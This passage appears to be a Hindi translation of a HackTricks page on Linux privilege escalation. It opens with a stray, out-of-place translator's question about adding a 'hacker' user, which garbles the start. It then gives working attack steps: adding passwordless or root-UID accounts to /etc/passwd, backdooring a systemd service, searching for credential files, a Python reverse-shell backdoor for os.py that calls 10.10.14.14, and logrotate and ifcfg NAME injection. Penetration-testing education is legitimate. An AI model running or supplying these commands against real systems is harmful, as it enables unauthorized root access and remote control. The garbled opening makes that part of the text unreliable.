- क्या आप सिर्फ अनुवादित टेक्स्ट में यूज़र `hacker` और जेनरेट किया गया पासवर्ड प्लेनटेक्स्ट में जोड़वाना चाहते हैं, या
- आप Linux कमांड भी चाहते हैं जो उस यूज़र को सिस्टम पर बनाए और पासवर्ड सेट करे (उदा. useradd/adduser + chpasswd), और पासवर्ड प्लेनटेक्स्ट में दिखना चाहिए या hashed रखना है?

आप उत्तर दें, मैं फिर अनुवाद करके वही markdown संरचना रखते हुए `hacker` यूज़र और जेनरेट किया गया पासवर्ड जोड़ दूंगा।
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
उदाहरण: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

अब आप `su` कमांड को `hacker:hacker` के साथ उपयोग कर सकते हैं।

अन्य विकल्प के रूप में, आप बिना पासवर्ड के एक नकली उपयोगकर्ता जोड़ने के लिए निम्न पंक्तियों का उपयोग कर सकते हैं।\ चेतावनी: आप मशीन की वर्तमान सुरक्षा को कमजोर कर सकते हैं।
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
नोट: BSD प्लेटफ़ॉर्म्स में `/etc/passwd` का स्थान `/etc/pwd.db` और `/etc/master.passwd` होता है, साथ ही `/etc/shadow` का नाम बदलकर `/etc/spwd.db` कर दिया गया है।

आपको जांचना चाहिए कि क्या आप **कुछ संवेदनशील फ़ाइलों में लिख सकते हैं**। उदाहरण के लिए, क्या आप किसी **service configuration file** में लिख सकते हैं?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
उदाहरण के लिए, यदि मशीन पर **tomcat** सर्वर चल रहा है और आप **/etc/systemd/ के अंदर Tomcat सेवा विन्यास फ़ाइल को संशोधित कर सकते हैं,** तो आप निम्न पंक्तियों को संशोधित कर सकते हैं:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
आपका backdoor अगली बार tomcat शुरू होने पर निष्पादित होगा।

### फ़ोल्डरों की जाँच करें

निम्न फ़ोल्डरों में बैकअप या रोचक जानकारी हो सकती है: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (शायद आप आखिरी वाले को पढ़ न सकें, लेकिन कोशिश करें)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### अजीब स्थान/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### पिछले मिनटों में संशोधित फ़ाइलें
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB फाइलें
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml फ़ाइलें
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### छिपी हुई फ़ाइलें
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Script/Binaries में PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Web फ़ाइलें**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **बैकअप्स**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### पासवर्ड्स रखने वाली ज्ञात फ़ाइलें

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) के कोड को पढ़ें, यह **कुछ संभावित फ़ाइलें जो passwords रख सकती हैं** ढूँढता है।\
**एक और दिलचस्प टूल** जिसे आप इसके लिए उपयोग कर सकते हैं: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) जो एक open source application है जिसका उपयोग लोकल कंप्यूटर पर Windows, Linux & Mac के लिए स्टोर किए गए कई passwords पुनः प्राप्त करने के लिए किया जाता है।

### Logs

यदि आप logs पढ़ सकते हैं, तो आप उनमें **दिलचस्प/गोपनीय जानकारी** पा सकते हैं। जितना अधिक अजीब log होगा, उतना अधिक रोचक वह होगा (probably).\
इसके अलावा, कुछ "**bad**" configured (backdoored?) **audit logs** आपको audit logs के अंदर **record passwords** करने की अनुमति दे सकते हैं जैसा कि इस पोस्ट में समझाया गया है: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/].
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
लॉग पढ़ने के लिए समूह [**adm**](interesting-groups-linux-pe/index.html#adm-group) बहुत सहायक होगा।

### Shell files
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

आपको उन फाइलों की भी जाँच करनी चाहिए जिनमें शब्द "**password**" उनके **name** में या उनके **content** के अंदर मौजूद हो, और साथ ही logs के अंदर IPs और emails, या hashes regexps भी चेक करें.\
मैं यहाँ यह सब कैसे करना है सूचीबद्ध नहीं कर रहा/रही हूँ, लेकिन अगर आप रुचि रखते हैं तो आप देख सकते हैं कि [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) कौन‑से अंतिम checks perform करता/करती है।

## लिखने योग्य फ़ाइलें

### Python library hijacking

यदि आप जानते हैं कि कोई python script किस **where** से execute होने वाली है और आप उस फ़ोल्डर के अंदर **can write inside** कर सकते हैं या आप **modify python libraries** कर सकते हैं, तो आप OS library को modify करके उसमें backdoor डाल सकते हैं (अगर आप उस जगह लिख सकते हैं जहाँ python script execute होने वाली है, तो os.py library को copy और paste कर दें)।

To **backdoor the library** बस os.py library के अंत में निम्नलिखित line जोड़ दें (change IP and PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate का शोषण

A vulnerability in `logrotate` lets users with **write permissions** on a log file or its parent directories potentially gain escalated privileges. This is because `logrotate`, often running as **root**, can be manipulated to execute arbitrary files, especially in directories like _**/etc/bash_completion.d/**_. It's important to check permissions not just in _/var/log_ but also in any directory where log rotation is applied.

> [!TIP]
> यह कमजोरी `logrotate` के संस्करण `3.18.0` और उससे पुराने को प्रभावित करती है

More detailed information about the vulnerability can be found on this page: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

You can exploit this vulnerability with [**logrotten**](https://github.com/whotwagner/logrotten).

This vulnerability is very similar to [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** so whenever you find that you can alter logs, check who is managing those logs and check if you can escalate privileges substituting the logs by symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

If, for whatever reason, a user is able to **write** an `ifcf-<whatever>` script to _/etc/sysconfig/network-scripts_ **or** it can **adjust** an existing one, then your **system is pwned**.

Network scripts, _ifcg-eth0_ for example are used for network connections. They look exactly like .INI files. However, they are ~sourced~ on Linux by Network Manager (dispatcher.d).

In my case, the `NAME=` attributed in these network scripts is not handled correctly. If you have **white/blank space in the name the system tries to execute the part after the white/blank space**. This means that **everything after the first blank space is executed as root**.

For example: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_ध्यान दें: Network और /bin/id के बीच रिक्त स्थान_)

### **init, init.d, systemd, and rc.d**

डायरेक्टरी `/etc/init.d` System V init (SysVinit) के लिए **scripts** का घर है, जो क्लासिक Linux सेवा-प्रबंधन सिस्टम है। इसमें सेवाओं को `start`, `stop`, `restart`, और कभी-कभी `reload` करने के लिए scripts शामिल होते हैं। इन्हें सीधे चलाया जा सकता है या `/etc/rc?.d/` में पाए जाने वाले symbolic links के माध्यम से। Redhat सिस्टम्स में वैकल्पिक पाथ `/etc/rc.d/init.d` है।

दूसरी ओर, `/etc/init` **Upstart** से जुड़ा है, जो Ubuntu द्वारा पेश किया गया एक नया **service management** है और सेवा-प्रबंधन कार्यों के लिए configuration files का उपयोग करता है। Upstart पर संक्रमण के बावजूद, Upstart में मौजूद compatibility layer के कारण SysVinit scripts अभी भी Upstart configurations के साथ उपयोग में रहते हैं।

**systemd** एक आधुनिक initialization और service manager के रूप में उभरता है, जो on-demand daemon starting, automount management, और system state snapshots जैसे उन्नत फीचर्स प्रदान करता है। यह फ़ाइलों को `/usr/lib/systemd/` (distribution packages के लिए) और `/etc/systemd/system/` (administrator modifications के लिए) में व्यवस्थित करता है, जिससे system administration प्रक्रिया सरल होती है।

## अन्य तरकीबें

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks आमतौर पर एक syscall को hook करते हैं ताकि privileged kernel functionality को userspace manager को एक्सपोज़ किया जा सके। कमजोर manager authentication (उदाहरण के लिए, FD-order पर आधारित signature checks या कमजोर password schemes) एक local app को manager का impersonate करने और पहले से rooted devices पर root तक escalate करने में सक्षम बना सकता है। अधिक जानकारी और exploit विवरण यहाँ हैं:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## और मदद

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Linux local privilege escalation vectors खोजने के लिए सर्वश्रेष्ठ टूल:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## संदर्भ

- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)


{{#include ../../banners/hacktricks-training.md}}
